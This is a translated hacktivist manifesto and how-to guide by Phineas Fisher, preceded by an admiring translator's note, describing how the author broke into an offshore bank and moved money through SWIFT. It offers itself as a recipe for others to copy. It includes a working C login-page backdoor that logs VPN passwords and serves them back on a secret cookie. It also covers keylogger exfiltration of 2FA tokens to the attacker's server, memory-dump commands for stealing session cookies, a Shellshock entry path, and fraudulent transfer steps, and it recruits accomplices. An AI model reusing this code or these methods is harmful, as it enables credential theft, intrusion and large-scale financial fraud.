@@ -1,0 +1,484 @@
+*******************************
+Translation notes:
+Bulk of translation done by Google Translate (which did a remarkably good job outside of slang and computer terms!), with edits for clarity and formatting by @laudecay. I got the Spanish version from the bottom of this article, it’s in the leak: https://unicornriot.ninja/2019/massive-hack-strikes-offshore-cayman-national-bank-and-trust/
+The UR article also has a lot of info about the history of Phineas’s hacks and resources she’s provided to the community in the past, and Crimethinc has some interviews with her. She’s also posted video interviews (a puppet and a voice actor reading chat logs, lol) and a screencast of her hacking a police department :)
+Sources are mostly left as in the original, except where there was an obvious directly translated english version lying around. Phineas Fisher frequently cites the original HackBack guide in Spanish. The English version is here: https://www.exploit-db.com/papers/41915. The resources and content may not be precisely the same between the two, so if you’re interested I’d recommend also running the Spanish one through gtranslate.
+Phineas, if you read this, the stuff you do is awesome and please never stop! I’m so glad you wrote this to accompany your leak, to educate people about important political topics and how to use computer skills to improve the world we live in. It’s difficult to radicalize people with these skillsets because of the salaries we get offered to sell out and be white-hat, and it’s difficult to get people who are already radicalized into hacking (at least in any kind of numbers) because the vast majority of them don’t have time to spend months or years getting the background knowledge to break into a modern network. The bug bounty and anarchist reading material you provided helps with the first, and the accessible infosec education portion helps with the second. I will definitely be sending this to people in both camps.
+On a personal note, I was also really happy that you referred to yourself publicly as a girl, there aren’t many other female anarchists or hackers that I’ve met, much less someone I’ve thought was so incredible for years now. OPSEC be damned, you’re inspirational as fuck, thank you for what you do.
+*******************************
+    _   _            _      ____             _    _
+   | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
+   | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
+   |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
+   |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
+                 A DIY guide to rob banks
+           
+                      ^__^
+                      (oo)\_______
+                   (  (__)\       )\/\
+                    _) /  ||----w |
+                   (.)/   ||     ||
+                    `'
+              By Subcowmandante Marcos
+I am a wild child
+Innocent, free, wild
+I am all ages
+My grandparents live on in me
+I am a brother of the clouds
+And I only know how to share
+I know that everything belongs to everyone,
+That everything is alive in me
+My heart is a star
+I am a son of the earth
+Traveling aboard my spirit
+I walk to eternity
+These are my simple words that seek to touch the hearts of people who are simple and humble, but also dignified and rebellious.  These are my simple words to tell about my hacks, and to invite other people to hack with cheerful rebellion.
+I hacked a bank. I did it to give an injection of liquidity, but this time from below and to the simple and humble people who resist and rebel against injustices throughout the world. In other words: I robbed a bank and gave away the money.  But it wasn't me alone who did it. The free software movement, the offensive powershell community, the metasploit project and the hacker community in general are what made this hack possible. The exploit.in community made it possible to convert intrusion into a bank's computers into cash and bitcoin. The Tor, Qubes and Whonix projects, together with the cryptographers and activists who defend privacy and anonymity, are my nahuales, that is, my protectors [1]. They accompany me every night and make it possible for me to remain free.
+I did nothing complicated. I only saw the injustice in this world, felt love for all beings, and expressed that love in the best way I could, through the tools I know how to use. Hate does not move me to banks, or to the rich, but a love for life, and the desire for a world where everyone can realize their potential and live a full life. I would like to explain a little how I see the world, so that you can get an idea of ​​how I came to feel and act like this. And I also hope that this guide is a recipe that you can follow, combining the same ingredients to bake the same cake. Who knows, out there these powerful tools could end up also serving you to express the love you feel.
+We are all innocent, free, wild wild children
+We are all brothers of the trees children of the earth
+We just have to put in our hearts a burning star
+(song by Alberto Kuselman and Chamalú)
+The police will invest a chingo of resources to investigate me. They think the system works, or at least it will work once they catch all the “bad boys”. I am nothing more than the product of a system that does not work. As long as there is injustice, exploitation, alienation, violence and ecological destruction, many more will come like me: an endless series of people who will reject as illegitimate the bad system responsible for this suffering. That badly done system is not going to get fixed by arresting me. I am only one of the millions of seeds that Tupac planted 238 years ago in La Paz [2], and I hope that my actions and writings water the seed of rebellion in their hearts.
+[1]  https://en.wikipedia.org/wiki/Cadejo#The_legend
+[2]  It was before he was killed by the Spaniards, just a day like yesterday, that he said that "they will only kill me, but tomorrow I will return and be millions."
+ ________________________________
+< To be seen, we cover our faces >
+ --------------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+          `'
+To make us listen, hackers sometimes have to cover their faces, because we are not interested you in seeing our face but instead in understanding our word.  The mask can be from Guy Fawkes, Salvador Dalí, from Fsociety, or in some cases the puppet of a crested toad. By affinity, this time I went to dig up a dead man to lend me his balaclava. I think then that I should clarify that Sup Marcos is innocent of all that is told here because, besides being dead, I did not consult him. I hope that his ghost, if he finds out from a Chiapaneca hammock, knows how to find the goodness to, as they say there, "dismiss this deep fake" with the same gesture with which an unwelcome insect moves away - which could well be a beetle.
+Even so with the balaclava and the name change, many of those who support my actions may pay too much attention to my person. With their own autonomy shattered for a lifetime of domination, they will be looking for a leader to follow, or a hero who saves them. But behind the balaclava, I'm just a girl. We are all wild children. We just have to place a star in the beds in our hearts.
+[1 - Why expropriate]
+Capitalism is a system in which a minority has come to appropriate a vast majority of the world's resources through war, theft and exploitation.  By snatching the commons [1], they forced those below to be under the control of that minority that owns everything.  It is a system fundamentally incompatible with freedom, equality, democracy and the Suma Qamaña (Good Living). It may sound ridiculous to those of us who have grown up in a propaganda machine that taught us that capitalism is freedom, but in truth what I am saying is not a new or controversial idea [2]. The founders of the United States of America knew they had to choose between creating a capitalist society, or a free and democratic society.  Madison recognized that "the man who possesses wealth, the one who lies on his couch or rolls in his carriage, cannot judge the wishes or feelings of the day laborer."  But to protect against the "spirit of equalization" of landless day laborers, it seemed to him that only landowners should vote, and that the government had to serve to "protect the opulent minority against the great majority."  John Jay was more to the point and said: "Those who own the country should rule it."
+____________________________________________________
+/     There is no such thing as green capitalism.    \
+|       Let’s make capitalism history before we      |
+\                   become history.                  /
+ ----------------------------------------------------
+ \     /\  ___  /\
+  \   // \/   \/ \\
+     ((    O O    ))
+      \\ /     \ //
+       \/  | |  \/
+        |  | |  |  
+        |  | |  |    
+        |   o   |  
+        | |   | |
+        |m|   |m|  
+Evgeny, the great ignored elephant, doesn't understand why everyone pretends not to see him on the panels on climate change, so here I give him a chance to say his lines.
+In the same way that bell hooks [3] argues that the rejection of the patriarchal culture of domination is an act in defense of the male's own interest (since it emotionally mutilates them and prevents them from feeling full love and connection), I think that the culture of domination of capitalism has a similar effect on the rich, and that they could have fuller and more satisfying lives if they rejected the class system from which they believe they benefit.  For many, class privilege amounts to a childhood of emotional neglect, followed by a life of superficial social interactions and meaningless work. In the end they may know that they can only genuinely connect with people when they work with them as their peers, and not when they put them at their service. They may know that sharing their material wealth is the best they can do with it. You may also know that the significant experiences, connections and relationships that count are not those that come from business interactions, but precisely to reject the logic of the market and give without expecting anything in return. They may know that all they need to escape from their prison and really live is to get carried away, give up control, and take a leap of faith. But most lack courage.
+Then it would be naive of us to direct our efforts to try to produce some kind of spiritual awakening in the rich [4].  As Astata Shakur says: "No one in the world, no one in history, has ever achieved his freedom by appealing to the moral sense of his oppressors". In fact, when the rich divide their money, they almost always do it in a way that reinforces the system that allowed them to amass their enormous and illegitimate wealth [5]. And change is unlikely to come through a political process; As Lucy Parsons says: "Let us never be fooled that the rich will let us vote to take away their wealth." Colin Jenkins justifies the expropriation with these words [6]:
+Make no mistake, expropriation is not theft. It is not the confiscation of money earned "with the sweat of the forehead". It is not theft of private property. It is, rather, the recovery of enormous amounts of land and wealth that have been forged with stolen natural resources, human slavery, forced labor force and amassed in hundreds of years by a small minority. This wealth ... is illegitimate, both for moral purposes and for the exploitation mechanisms that have been used to create it.
+For Colin, the first step is that “we have to free ourselves from our mental ties (believing that wealth and private property have been earned by those who monopolize them; and that, therefore, they should be something to respect, revere, and even  something to pursue), open our minds, study and learn from history, and recognize this illegitimacy together”. Here are some books that have helped me with this: [7] [8] [9] [10] [11].
+ According to Barack Obama, economic inequality is "the challenge that defines our time."  Computer hacking is a powerful tool to combat economic inequality.  The former director of the NSA, Keith Alexander, agrees and says that hacking is responsible for "the greatest transfer of wealth in history."
+______________________________
+/      The story is ours     \
+\ and it is done by hackers! /
+ ----------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+          `'
+Everyone together, now and forever!
+[1] https://sursiendo.com/docs/Pensar_desde_los_comunes_web.pdf
+[2] https://chomsky.info/commongood02/ 
+[3] The Will to Change: Men, Masculinity, and Love
+[4] their own religion is very clear about this: https://dailyverses.net/es/materialismo
+[5] https://elpulso.hn/la-filantropia-en-los-tiempos-del-capitalismo/
+[6] http://www.hamptoninstitution.org/expropriation-or-bust.html
+[7] Manifiesto por una Civilización Democrática. Volumen 1, Civilización: La Era de los Dioses Enmascarados y los Reyes Cubiertos
+[8] Calibán y la Bruja
+[9] En deuda: Una historia alternativa de la economía
+[10] La otra historia de los Estados Unidos
+[11] Las venas abiertas de América Latina
+        _______________________________
+       < Our weapons are our keyboards >
+        --------------------------------
+                  \
+                   \ ^__^
+                     (oo)\_______
+                  (  (__)\       )\/\
+                   _) /  ||----w |
+                  (.)/   ||     ||
+                   `'    ^^     ^^
+ [2 - Introduction]
+This guide explains how I hacked the Cayman Bank and Trust Company (Isle of Man).  Why am I publishing this, almost four years later?
+ 1) To show what is possible
+Hackers working for social change have limited themselves to developing security and privacy tools, DDoS, performing vandalism and leaks. Wherever you go, there are radical projects for a social change in a complete state of precariousness, and there would be much that they could do with some expropriated money. At least for the working class, bank robbery is something socially accepted, and those who do are seen as heroes of the people. In the digital age, robbing a bank is a non-violent, less risky act, and the reward is greater than ever. So why are only black hat hackers doing it for their personal benefit, and never hacktivists to finance radical projects? Maybe they don't think they are capable of doing it. The big bank hacks are on the news every so often, such as the hacking of the Bank of Bangladesh [1], which was attributed to North Korea, or the hacking of banks attributed to the Carbanak group [2], which they describe as a very large and well organized group of Russian hackers, with different members who would be specialized in different tasks. But, it is not that complicated.
+It is because of our collective belief that the financial system is unquestionable that we exercise control over ourselves, and maintain the class system without those above having to do anything [3]. Being able to see how vulnerable and fragile the financial system really is helps us break that collective hallucination. That is why banks have a strong incentive not to report hacks, and to exaggerate how sophisticated the attackers are. None of the financial hacks I made, or those I've known, have ever been reported. This is going to be the first, and not because the bank wanted to, but because I decided to publish it.
+As you are about to learn in this home guide, hacking a bank and transferring money through the SWIFT network does not require the support of any government or a large and specialized group.  It is something totally possible being a mere amateur hacker, with only public tools and basic knowledge of how to write a script.
+[1] https://elpais.com/economia/2016/03/17/actualidad/1458200294_374693.html 
+[2] https://securelist.lat/el-gran-robo-de-banco-el-apt-carbanak/67508/ 
+[3] https://es.wikipedia.org/wiki/Hegemon%C3%ADa_cultural 
+ 2) Help withdraw cash
+Many of those who read this already have, or with a little study will be able to acquire, the skills needed to carry out a hack like this.  However, many will find that they lack the necessary criminal connections to get the handles in condition. In my case, this was the first bank that hacked, and at that time I only had a few and mediocre accounts ready to withdraw the cash (known as bank drops), so it was only a few hundred thousand that I could withdraw at total, when it is normal to get millions. Now, on the other hand, I do have the knowledge and connections to get cash more seriously, so if you are hacking a bank but need help to convert that into real money, and you want to use that money to finance radical social projects, you can contact me.
+ 3) Collaborate
+It is possible to hack banks as an amateur who works alone, but the net is that, in general, it is not as easy as I paint it here.  I was lucky with this bank for several reasons:
+1. It was a small bank, so it took me much less time to understand how everything worked.
+2. They had no procedure to check the sent swift messages.  Many banks have one, and you need to write code to hide your transfers from their monitoring system.
+3. They only used password authentication to access the application with which they connected to the SWIFT network. Most banks now use RSA SecurID, or some form of 2FA.  You can skip this by typing code to get an alert when your token enters, so you can use it before it expires. It's simpler than it seems: I used Get-Keystrokes [1], modifying it so that instead of storing the pressed keys, a GET request is made to my server every time it is detected that they have entered a username. This request adds the username to the url and, as they type the token, several GETs are made with the token digits concatenated to the url. On my side I leave this running in the meantime:
+  ssh me@my_secret_server 'tail -f /var/log/apache2/access_log'
+    | while read i; do echo $i; aplay alarma.wav &> /dev/null; done
+ If it is a web application, you can skip the 2FA by stealing the cookie after they have authenticated. I am not an APT with a team of coders who can make me customized tools. I am a simple person who subsists on what the terminal gives [2], so what I use is:
+procdump64 /accepteula -r -ma PID_of_browser
+ strings64 /accepteula * .dmp |  findstr PHPSESSID 2> nul
+ or going through findstr rather than strings, which makes it much faster:
+findstr PHPSESSID * .dmp> tmp
+     strings64 /accepteula tmp |  findstr PHPSESSID 2> nul
+Another way to skip it is to access your session with a hidden VNC (hvnc) after they have authenticated, or with a little creativity you could also focus on another part of their process instead of sending SWIFT messages directly.
+I think that if I collaborated with other experienced bank hackers we could hack hundreds of banks like Carnabak, instead of doing one from time to time on my own.  So if you have experience with similar hacks and want to collaborate, contact me.  You will find my email and my PGP key at the end of the previous guide [3].
+[1] https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1
+[2] https://lolbas-project.github.io/
+[3] https://www.exploit-db.com/papers/41914
+________________________________________
+/ If robbing a bank could change things, \
+\ they’d make it illegal.                /
+ ----------------------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+ [3 - Be careful out there]
+It is important to take some simple precautions.  I will refer to this same section of my last guide [1], since it seems to work just fine [2]. All I have to add is that, in Trump's words, "Unless you catch hackers in the act, it is difficult to determine who was doing the hacking," so the police are getting more and more creative [3][4] in their attempts to grab criminals in the act (when their encrypted hard drives are unlocked). So it would be nice if for example you carry a certain bluetooth device and configure your computer to turn off when it moves beyond a certain range, or when an accelerometer detects movement, or something like that.
+It may be that writing long articles detailing your actions and your ideology is not the safest thing in the world (oops!), but at times I feel I have to.
+ If I didn't believe in who listens to me
+ If I didn't believe in what hurts
+ If I didn't believe in what's left
+ If I didn't believe in what I fought
+ What a thing ...
+ What was the club without a quarry?
+[1] https://www.exploit-db.com/papers/41914
+[2] https://www.wifi-libre.com/topic-1268-italia-se-rinde-y-deja-de-buscar-a-phineas-fisher.html 
+[3] https://www.wired.com/2015/05/silk-road-2/
+[4] https://motherboard.vice.com/en_us/article/59wwxx/fbi-airs-alexandre-cazes-alphabay-arrest-video
+
+ Many blame queer people for the decline of this society;
+ we are proud of it
+ Some believe we want to reduce to ashes
+ this civilization and its moral fabric;
+ They couldn't be more right
+ They often describe us as depraved, decadent and revolting
+ But alas! They haven't seen anything yet
+(https://theanarchistlibrary.org/library/mary-nardini-gang-be-gay-do-crime)
+ [4 - Get access]
+In another place [1] I talked about the main ways to get initial access to a company's network during a targeted attack. However, this was not a targeted attack. I did not set out to hack a specific bank, what I wanted was to hack any bank, which ends up being a much simpler task.  This type of nonspecific approach was popularized by Lulzsec and Anonymous [2]. As part of the earlier essay, I prepared an exploit and post-exploitation tools for a popular VPN device. Then I started scanning the entire internet with zmap and zgrab to identify other vulnerable devices [3]. I had the scanner save the vulnerable IPs, along with the common and alt names of the device's SSL certificate, the device's Windows domain names, and the reverse DNS lookup of the IP. I grepped the results for the word "bank", and there were plenty to choose from, but the truth is that I was attracted to the word "Cayman", and that's how I came to choose this one.
+[1] https://www.exploit-db.com/papers/41914
+[2] https://web.archive.org/web/20190329001614/http://infosuck.org/0x0098.png
+[3] https://github.com/zmap/zmap
+ [4.1 - The Exploit]
+When I published my latest DIY guide [1] I did not reveal the details of the sonicwall exploit that I had used to hack Hacking Team, as it was very useful for other hacks (such as this one) and I still had not finished having fun with it. Determined then to hack Hacking Team, I spent weeks reverse engineering their sonicwall ssl-vpn model, and even managed to find several memory corruption vulnerabilities that were more or less difficult to exploit, before I realized that the device was easily exploitable with shellshock [2].  When shellshock came out, many sonicwall devices were vulnerable, with only a request to cgi-bin/welcome and a payload in the user-agent. Dell released a security update and an advisory for these versions. The version used by Hacking Team and this bank had the vulnerable bash version, but the cgi requests did not trigger the shellshock- except for the requests to a shell script, and there was one accessible: cgi-bin/jarrewrite.sh. This seems to have escaped Dell's notice, since they never released a security update or an advisory for that version of the sonicwall. And, kindly, Dell had setuid’d root on dos2unix, leaving the device easy to root.
+In my last guide many read that I spent weeks researching a device until I found an exploit, and assumed that it meant that I was some kind of elite hacker. The reality, that is, the fact that it took me two weeks to realize that it was trivially exploitable with shellshock, is perhaps less flattering to me, but I think it is also more inspiring. Shows that you can really do this for yourself. You don't need to be a genius, I certainly am not.  Actually my work against Hacking Team started a year earlier. When I discovered Hacking Team and the Gamma Group in the CitizenLab investigations [3][4], I decided to explore a bit and see if I could find anything. I didn't get anywhere with Hacking Team, but I was lucky with Gamma Group, and I was able to hack their customer support portal with basic sql injection and file upload vulnerabilities [5][6]. However, although the customer support server gave me a pivot towards the internal network of Gamma Group, I was unable to penetrate further into the company. From this experience with the Gamma Group and other hacks, I realized that I was really limited by my lack of knowledge about privilege escalation and lateral movement in windows domains, active directory and windows in general.  So I studied and practiced (see section 11), until I felt I was ready to pay a visit to Hacking Team almost a year later. The practice paid off, and this time I was able to make a complete commitment from the company [7]. Before I realized that I could enter with shellshock, I was willing to spend happy whole months of life studying exploit development and writing a reliable exploit for one of the memory corruption vulnerabilities I had encountered. I just knew that Hacking Team needed to be exposed, and that it would take me as much time as necessary and learn what I had to learn to get it. To perform these hacks you don't need to be bright. You don't even need great technical knowledge. You just need dedication, and believe in yourself.
+[1] https://www.exploit-db.com/papers/41914
+[2] https://es.wikipedia.org/wiki/Shellshock_(error_de_software)
+[3] https://citizenlab.ca/tag/hacking-team/
+[4] https://citizenlab.ca/tag/finfisher/
+[5] https://theintercept.com/2014/08/07/leaked-files-german-spy-company-helped-bahrain-track-arab-spring-protesters/
+[6] https://www.exploit-db.com/papers/41913
+[7] https://web.archive.org/web/20150706095436/https://twitter.com/hackingteam
+ [4.2 - The Backdoor]
+Part of the backdoor I prepared for Hacking Team (see the first footnote in section 6) was a simple wrapper on the login page to capture passwords:
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+int main()
+{
+        char buf[2048];
+        int nread, pfile;
+        /* pull the log if we send a special cookie */
+        char *cookies = getenv("HTTP_COOKIE");
+        if (cookies && strstr(cookies, "our private password")) {
+                write(1, "Content-type: text/plain\n\n", 26);
+                pfile = open("/tmp/.pfile", O_RDONLY);
+                while ((nread = read(pfile, buf, sizeof(buf))) > 0)
+                        write(1, buf, nread);
+                exit(0);
+        }
+        /* the parent stores the POST data and sends it to the child, which is the actual login program */
+        int fd[2];
+        pipe(fd);
+        pfile = open("/tmp/.pfile", O_APPEND | O_CREAT | O_WRONLY, 0600);
+        if (fork()) {
+                close(fd[0]);
+                while ((nread = read(0, buf, sizeof(buf))) > 0) {
+                        write(fd[1], buf, nread);
+                        write(pfile, buf, nread);
+                }
+                write(pfile, "\n", 1);
+                close(fd[1]);
+                close(pfile);
+                wait(NULL);
+        } else {
+                close(fd[1]);
+                dup2(fd[0],0);
+                close(fd[0]);
+                execl("/usr/src/EasyAccess/www/cgi-bin/.userLogin",
+                      "userLogin", NULL);
+        }
+}
+In the case of Hacking Team, they were logging on to the VPN with single-use passwords, so the VPN gave me access only to the network, and from there it took an extra effort to get domain admins on their network. In the other guide I wrote about side passes and privilege escalation in windows domains [1]. In this case, on the other hand, it was the same Windows domain passwords that were used to authenticate against the VPN, so I could get a good user password, including that of the domain admin. Now I had full access to his network, but usually this is the easy part. The most complicated part is to understand how they operate and how to get what you want out of their network.
+[1] https://www.exploit-db.com/papers/41914
+[4.3 - Fun facts]
+Following the investigation they did about the hacking, I found it interesting to see that, by the same time I did it, the bank could have been compromised by someone else through a targeted phishing email [1].  As the old saying goes, "give a man an exploit and he will have access for a day, teach phishing and he will have access all his life" [2]. The fact that someone else, by chance and at the same time as me, put this small bank in the spotlight (they registered a domain similar to the real domain of the bank to be able to phish from there) suggests that bank hacks occur with  much more frequently than is known.
+A fun suggestion for you to follow the investigations of your hacks is to have a backup access, one that you won't touch unless you lose normal access. I have a simple script that expects commands once a day, or less, just to maintain long-term access in case they block my regular access. Then I had a powershell empire [3] calling home more frequently to a different IP, and I used empire to launch meterpreter [4] against a third IP, where I did most of my work. When PWC started investigating the hacking, they found my use of empire and meterpreter and cleaned those computers and blocked those IPs, but they didn't detect my backup access. PWC had placed network monitoring devices, in order to analyze the traffic and see if there were still infected computers, so I didn't want to connect much to their network. I only launched mimikatz once to get the new passwords, and from there I could continue my research by reading their emails in the outlook web access.
+[1] page 47, Project Pallid Nutmeg.pdf, in torrent
+[2] https://twitter.com/thegrugq/status/563964286783877121
+[3] https://github.com/EmpireProject/Empire
+[4] https://github.com/rapid7/metasploit-framework
+ [5 - Understand Banking Operations]
+To understand how the bank operated, and how I could get money, I followed the techniques that I summarized in [1], in section “13.3 - Internal Recognition”. I downloaded a list of all file names, grepped for words like "SWIFT" and "transfer", and downloaded and read all files with interesting names. I also looked for emails from employees, but by far the most useful technique was to use keyloggers and screenshots to see how bank employees worked. I didn't know it at the time, but for this, Windows has a very good monitoring tool [2].  As described in technique no. 5 of section 13.3 in [1], I made a capture of the keys pressed throughout the domain (including window titles), I did a grep in search of SWIFT, and found some employees opening ‘SWIFT Access Service Bureau - Logon’. For those employees, I ran meterpreter as in [3], and used the post/windows/gather/screen_spy module to take screenshots every 5 seconds, to see how they worked. They were using a remote citrix app from the bottomline company [4] to access the SWIFT network, where each payment message SWIFT MT103 had to go through three employees: one to "create" the message, one to "verify" it,  and another to "authorize it." Since I already had all their credentials thanks to the keylogger, I could easily perform all three steps myself.  And from what I knew after seeing them work, they didn't review the SWIFT messages sent, so I should have enough time to get the money from my bank drops before the bank realized and tried to reverse the transfers.
+[1] https://www.exploit-db.com/papers/41914
+[2] https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/
+[3] https://www.trustedsec.com/blog/no_psexec_needed/
+[4] https://www.bottomline.com/uk/products/bottomline-swift-access-services
+_______________________________________
+/ Whoever robs a thief, gets 100 years \
+\ of forgiveness.                      /
+ ---------------------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+          `'
+[6 - Send the money]
+I had no idea what I was doing, so I was discovering it along the way. Somehow, the first transfers I sent went well. The next day, I screwed up by sending a transfer to Mexico that ended my fun. This bank sent its international transfers through its correspondent account in Natwest. I had seen that the correspondent account for transfers in pounds sterling (GBP) appeared as NWBKGB2LGPL, while for the others it was NWBKGB2LXXX. The Mexican transfer was in GBP, so I assumed that I had to put NWBKGB2LGPL as a correspondent. If I had prepared it better I would have known that the GPL instead of XXX indicated that the payment would be sent through the UK Fast Payment Service, rather than as an international transfer, which obviously will not work when you are trying of sending money to Mexico. So the bank got an error message. On the same day I also tried to send a payment of £200k to the UK using NWBKGB2LGPL, which was not made because 200k exceeded the shipping limit by fast payments, and would have had to use NWBKGB2LXXX instead. They also received an error message for this. They read the messages, investigated it, and found the rest of my transfers.
+[7 - The loot]
+From what I write, you can get a complete idea of what my ideals are and to what things I give my support. But I would not like to see anyone in legal trouble for receiving expropriated funds, so not another word of where the money went. I know that journalists are probably going to want to put some number on how many dollars were distributed in this hack and similar ones, but I prefer not to encourage our perverse habit of measuring the actions just by their economic value. Any action is admirable if it comes from love and not from the ego. Unfortunately those above, the rich and powerful, public figures, businessmen, people in "important" positions, those that our society most respects and values, those have been placed where they are based on acting more since the ego than from love. It is in the simple, humble and "invisible" people that we should look at and whom we should admire.
+[8 - Cryptocurrencies]
+Redistributing expropriated money to Chilean projects seeking positive social change would be easier and safer if those projects accepted anonymous donations via cryptocurrencies such as monero, zcash, or at least bitcoin. It is understood that many of these projects have an aversion to cryptocurrencies, as they resemble some strange hypercapitalist dystopia rather than the social economy we dream of. I share their skepticism, but I think they are useful to allow donations and anonymous transactions, by limiting government surveillance and control. Same as cash, whose use many countries are trying to limit for the same reason.
+[9 - Powershell]
+In this operation, as in [1], I used a lot of powershell. Then, powershell was super cool, you could do almost anything you wanted, without antivirus detection and with very little forensic footprint. It happens that with the introduction of AMSI [2], offensive powershell is retiring. Today offensive C# is what is on the rise, with tools like [3][4][5][6]. AMSI is going to get to .NET for 4.8, so the tools in C# probably still have a couple of years left before they get dated. And then we will use C or C++ again, or maybe Delphi will become fashionable again. The specific tools and techniques change every few years, but basically it is not so much what changes, today hacking is essentially the same thing it was in the 90s. In fact, all the powershell scripts used in this guide and in the previous one are still perfectly usable today, after a little obfuscation of your own.
+[1] https://www.exploit-db.com/papers/41914
+[2] https://medium.com/@byte_St0rm/adventures-in-the-wonderful-world-of-amsi-25d235eb749c
+[3] https://cobbr.io/SharpSploit.html
+[4] https://github.com/tevora-threat/SharpView
+[5] https://www.harmj0y.net/blog/redteaming/ghostpack/
+[6] https://web.archive.org/web/20191114034546/https://rastamouse.me/2019/08/covenant-donut-tikitorch/
+___________________________
+/   Fo Sostyn, Fo Ordaag    \
+\ Financial Sector Fuck Off /
+ ---------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+          `'
+[10 - Torrent]
+Privacy for the weak, transparency for the powerful.
+Offshore banking provides executives, politicians and millionaires with privacy from of their own government. Exposing them may sound hypocritical on my part, since I am generally in favor of privacy and against government oversight. But the law was already written by and for the rich: it protects its system of exploitation, with some limits (such as taxes) so that society can function and the system does not collapse under the weight of its own greed. So no, privacy is not the same for the powerful, when it allows them to evade the limits of a system designed to give them privileges; and privacy for the weak, whom it protects from a system designed to exploit them.
+Even journalists with the best intentions find it impossible to study such a huge amount of material and know what will be relevant for people in different parts of the world. When I leaked the Hacking Team files, I gave The Intercept a copy of the emails one month in advance. They found a couple of the 0days that Hacking Team was using, previously reported them to MS and Adobe and published a few stories once the leak was made public. There is no point of comparison with the enormous amount of articles and research that came after the complete leak to the public. Seeing it this way, and also considering the (not) editorialized publication [1] of the Panama papers, I think that a public and complete leak of this material is the right choice.
+[1] https://www.craigmurray.org.uk/archives/2016/04/corporate-media-gatekeepers-protect-western-1-from-panama-leak/
+Psychologists found that those who are lower in the hierarchies tend to understand and empathize with those at the top, but vice versa is less common. This explains why, in this sexist world, many men joke about their inability to understand women, as if it were an irresolvable mystery. Explains why the rich, if they stop to think about those who live in poverty, give advice and "solutions" so alien to reality that we want to laugh. Explain why we revere executives as brave who take risks. What do they risk, beyond their privilege? If all their ventures fail, they will have to live and work like the rest of us. It also explains why there will be many who accuse me of being irresponsible and dangerous by leaking this without redaction. They feel the "danger" around an offshore bank and its customers much more intensely than they feel the misery of those dispossessed by this unfair and unequal system. And this leak of their finances, is it a danger to them, or perhaps only to their position at the top of a hierarchy that should not even exist?
+
+Translation: “They vilify us, these infamous people; When the only difference is that they steal from the poor, protected by the law, heaven knows, and we get the rich under the sole protection of our own courage. Don't you have to prefer to be one of us, rather than indulge those villains in search of a job? - Captain Bellamy”
+[11 - Learn to hack]
+You don't start hacking well. You start hacking shit, thinking it's good, and then gradually you get better. That is why I always say that one of the most valuable virtues is persistence.
+- Octavia Butler's advice for the APT candidate
+The best way to learn to hack is by hacking. Put together a laboratory with virtual machines and start testing things, taking a break to investigate anything you don't understand. At the very least you will want a windows server as a domain controller, another normal Windows vm attached to the domain, and a development machine with visual studio to compile and modify tools. Try to make an office document with macros that launch meterpreter or another RAT, and try meterpreter, mimikatz, bloodhound, kerberoasting, smb relaying, psexec and other lateral movement techniques[1]; as well as the other scripts, tools and techniques mentioned in this guide and in the previous one[2]. At first you can disable windows defender, but then try it all by having it activated [3][4] (but deactivating the automatic sending of samples). Once you're comfortable with all that, you'll be ready to hack 99% of companies. There are a couple of things that at some point will be very useful in your learning, such as getting comfortable with bash and cmd.exe, a basic domain of powershell, python and javascript, having knowledge of kerberos [5][6] and active directory [7][8][9][10], and fluent English. A good introductory book is The Hacker Playbook.
+I also want to write a little about things to not focus on if you don't want to entertain the idea of you hacking things just because someone has told you that you are not a “real” hacker if you don't know assembly. Obviously, learn whatever interests you, but I write these lines thinking about those things that you can focus on in order to get practical results if you're looking to hack companies to filter and expropriate. A basic knowledge of web application security [11] is useful, but specializing more in web security is not really the best use of your time, unless you want to make a career in pentesting or chasing bug rewards. CTFs, and most of the resources you'll find when looking for information about hacking, generally focus on skills such as web security, reverse engineering, exploit development, etc. These things make sense by understanding them as a way to prepare people for careers in the industry, but not for our goals. Intelligence agencies can afford to have a team dedicated to the most advanced techniques in fuzzing, a team working on exploit development with a guy investigating exclusively the new techniques of heap manipulation, etc. We don't have the time or the resources for that. The two most important skills for practical hacking are phishing [12] and social engineering to get initial access, and then being able to climb and move through the Windows domains.
+[1] https://hausec.com/2019/08/12/offensive-lateral-movement/
+[2] https://www.exploit-db.com/papers/41914
+[3] https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf
+[4] https://www.trustedsec.com/blog/discovering-the-anti-virus-signature-and-bypassing-it/
+[5] https://www.tarlogic.com/en/blog/how-kerberos-works/
+[6] https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+[7] https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
+[8] https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/
+[9] https://adsecurity.org/
+[10] https://github.com/infosecn1nja/AD-Attack-Defense
+[11] https://github.com/jhaddix/tbhm
+[12] https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-external-engagement-through-spear-phishing/
+[12 - Recommended Reading]
+_______________________________________
+/ When the scientific level of a world \
+| far exceeds its level of solidarity, |
+\ that world destroys itself.          /
+ --------------------------------------
+                  \   _.---._   .            .
+            *      \.'       '.       *
+*               _.-~===========~-._
+    .          (___________________)       .   *
+              .'     \_______/   .'
+                           .'  .'  
+                          '        
+                     - me
